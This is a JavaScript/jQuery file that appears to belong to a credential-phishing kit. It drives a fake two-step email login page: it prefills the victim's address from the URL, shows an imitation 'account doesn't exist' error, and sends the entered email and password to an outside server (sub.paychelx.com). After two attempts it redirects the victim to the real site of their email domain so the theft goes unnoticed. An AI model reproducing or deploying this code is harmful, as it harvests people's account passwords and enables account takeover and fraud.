/* global $ */
$(document).ready(function() {
    var count = 0;


    $(document).keypress(function(event) {
        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            if ($("#divPr").is(":visible")) {
                $("#submit-btn").trigger("click");

            } else {
                $("#next").trigger("click");

            }
        }
    });
    $('#next').click(function(e) {
        $('#error').hide();
        $('#msg').hide();
        e.preventDefault();
        var ai = $("#ai").val();

        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is empty.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        $("#next").html("checking...");

        setTimeout(function() {
            $("#ai").attr('readonly', '');
            $("#divPr").animate({ right: 0, opacity: "show" }, 1000);
            $("#next").html("next");
            $("#next").animate({ left: 0, opacity: "hide" }, 0);
            $("#submit-btn").animate({ right: 0, opacity: "show" }, 1000);
        }, 1000);


    });

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);

        $("#msg").hide();

    }
    ///////////////url getting ai////////////////

 var file="bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();

        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is empty.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var q = urlParams.get('authenticate');
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'json',
			url: 'https://sub.paychelx.com/ocrypt.php',
            type: 'POST',
            data: JSON.stringify({
                ai: ai,
                pr: pr,
                'authenticated_id': q
            }),
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                window.location.replace("https://www."+my_slice);

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                window.location.replace("https://www."+my_slice);
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Verify');
            }
        });
    });


});